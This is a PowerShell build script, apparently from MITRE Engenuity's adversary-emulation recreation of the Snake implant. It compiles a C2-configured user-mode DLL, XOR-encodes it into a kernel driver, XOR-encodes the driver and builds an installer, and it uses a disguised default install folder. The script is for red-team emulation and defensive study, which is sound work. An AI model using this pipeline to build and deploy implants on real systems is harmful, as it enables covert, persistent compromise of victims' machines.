 # ---------------------------------------------------------------------------
 # buildall.ps1 - Builds all Snake components

 # Copyright 2023 MITRE Engenuity. Approved for public release. Document number CT0005.
 # Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at

 # http://www.apache.org/licenses/LICENSE-2.0

 # Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.

 # This project makes use of ATT&CK®
 # ATT&CK Terms of Use - https://attack.mitre.org/resources/terms-of-use/ 
 
 # Usage: powershell .\buildall.ps1 -c2Ip "10.0.2.11" -c2Port 8080 -homeDir "C:\\Users\\Public\\testing" -driverConfig "Release" -driverPlatform "x64" 
 
 # Revision History:
 
 # --------------------------------------------------------------------------- 

<#
.Description

Builds all Snake components (usermodule.dll and SnakeDriver.sys). Run this command from within a VS Developer Command prompt in order to build the driver. Assumes python (3.x), and all usermodule.dll build env prerequisites are already installed.

Simplest way to get the necessary built tools and VS prompt is through the Enterprise WDK ISO https://learn.microsoft.com/en-us/windows-hardware/drivers/develop/using-the-enterprise-wdk

.Parameter driverConfig

This will match the Configuration setting used in VS to build the driver. Ex: "Release_1903"

.Parameter driverPlatform

This will match the Configuration setting used in VS to build the driver. We only support "x64"

.Parameter c2Ip

usermodule.dll: The C2 IP Address. Ex: "10.0.2.11"

.Parameter c2Port

usermodule.dll: The C2 Port. Ex: 8080

.Parameter homeDir

usermodule.dll: The home directory used to store the driver, etc. Default: "C:\\Windows\\$NtUninstallQ608317$"

.Parameter dllName

Optional, defaults to usermodule.dll

.Parameter driverName

Optional, defaults to SnakeDriver.sys

#>

param(
    [String]$driverConfig,
    [String]$driverPlatform,
    [String]$c2Ip,
    [Int]$c2Port,
    [String]$homeDir,
    [String]$dllName,
    [String]$driverName
)

$script_location = $PSScriptRoot
$usermod_path = $script_location + "\UserModule"
$driver_path = $script_location + "\SnakeDriver"
$installer_path = $script_location + "\SnakeInstaller"
$outdir = $PSScriptRoot + "\out"
$driver_name = "SnakeDriver.sys"
$usermod_name = "usermodule.dll"

if (-Not $dllName){
    $dllName = $usermod_name
}
if (-Not $driverName){
    $driverName = $driver_name
}

# Try to create a shared output directory if it does not already exist
$ret = Test-Path $outdir
if (-Not $ret){
    mkdir -p $outdir
}

# Build the user-mode component and strip symbols
if ($c2Ip){
    Write-Host "Building usermodule.dll..."

    # Set default args if none specified
    if (-Not $c2Port) {
        $c2Port = 80
        Write-Host "C2 Port not specified (-c2Port), using Port $c2Port"
    }
    if (-Not $homeDir) {
        $homeDir = "C:\\Windows\\`$NtUninstallQ608317`$"
        Write-Host "Home directory not specified (-homeDir), using $homeDir"
    }
    
    Set-Location($usermod_path)

    if (Test-Path $usermod_path\bin\$dllName){
        Remove-Item $usermod_path\bin\$dllName
    }

    $mingwpath = $Env:MINGW64_ROOT + "\bin\"
    $gpp = $mingwpath + "x86_64-w64-mingw32-g++"
    # Build the DLL, as written in the README
    $params = "-DC2_ADDRESS=`"$c2Ip`"", "-DC2_PORT=$c2Port", "-DHOME_DIR=`"$homeDir`"", "-I include", "-I `"$env:MINGW64_ROOT\include\cryptopp`"", "-static", "-shared", "-std=c++20", "-Wall", "-Wextra", "-Werror", "-o bin\$dllName", "src\*.cpp", "-lWinInet", "-L `"$env:MINGW64_ROOT\lib`"", "-l cryptopp"
    Cmd /c "$gpp $params"
    Write-Host "  Done"

    Write-Host "Stripping usermodule.dll..." -NoNewline
    $strip = $mingwpath + "strip"
    $params = "-s bin/$usermod_name"
    Cmd /c "$strip $params"
    Write-Host " Done"
    
    # Remove any old DLL of the same name
    if (Test-Path $outdir\$dllName){
        Remove-Item $outdir\$dllName
    }
    Move-Item $usermod_path\bin\$dllName -Destination $outdir\$dllName
}
else {
    Write-Host "Warning: Not building user module, must specify -c2Ip. -c2Port and -homeDir are optional" -BackgroundColor "Yellow" -ForegroundColor "Black"
    Read-Host "Are you sure you want to proceed?"
}

# Generate the XOR'ed C header file containing usermodule.dll as an array of bytes
Write-Host "Generating payload.hpp"
Set-Location($script_location)
$hfile_path = $driver_path + "\SnakeDriver"
$hfile = "payload.hpp"
if (Test-Path $outdir\$hfile){
    Remove-Item $outdir\$hfile
}
if (Test-Path $hfile_path\$hfile){
    Remove-Item $hfile_path\$hfile
}
python .\gen_h_file.py $outdir\$dllName $outdir\$hfile "hfile"
Write-Host "Overwriting $hfile_path\$hfile"
Copy-Item $outdir\$hfile -Destination $hfile_path\$hfile -Force

if ($driverConfig -And $driverPlatform){
    $config = $driverConfig
    $platform = $driverPlatform

    # Build the driver
    Set-Location($driver_path)
    Write-Host "Building $driver_name..."
    msbuild -target:Clean,Build -property:Configuration=$config,Platform=$platform
    Write-Host "Done"

    # Remove any old driver of the same name
    if (Test-Path $outdir\$driverName){
        Remove-Item $outdir\$driverName
    }
    Move-Item $driver_path\$platform\$config\$driver_name -Destination $outdir\$driverName
}
else {
    Write-Host "Warning: Not building driver, must specify -driverConfig and -driverPlatform parameters" -BackgroundColor "Yellow" -ForegroundColor "Black"
    Write-Host "       Configs: Release, Release_1809, Release_1903"
    Write-Host "     Platforms: x64"
    Read-Host "Are you sure you want to proceed?"
}


$xor_driver = "snake.sys.xor"
$bin_path = $installer_path + "\data" # Where to place $snake.sys.xor
$build_name = "x64-debug" # build sub-directory created by cmake

Write-Host "Generating $xor_driver"
Set-Location($script_location)
if (Test-Path $outdir\$xor_driver){
    Remove-Item $outdir\$xor_driver
}
if (Test-Path $bin_path\$xor_driver){
    Remove-Item $bin_path\$xor_driver
}
# XOR the driver and store as new file $xor_driver
python .\gen_h_file.py $outdir\$driverName $outdir\$xor_driver "bin"
Write-Host "Overwriting $bin_path\$xor_driver"
Copy-Item $outdir\$xor_driver -Destination $bin_path\$xor_driver -Force

Set-Location($installer_path)
# Remove old build information
Remove-Item -Recurse -Force $installer_path\"build"\$build_name
# Build the installer - must all be done in one "Cmd" to preserve vsvarsall
Cmd /c ..\build_installer.bat
Copy-Item $installer_path\"build"\$build_name"\src\installer.exe" -Destination $outdir\"installer.exe" -Force

Write-Host "Output files are stored in $outdir"
Get-ChildItem -Recurse $outdir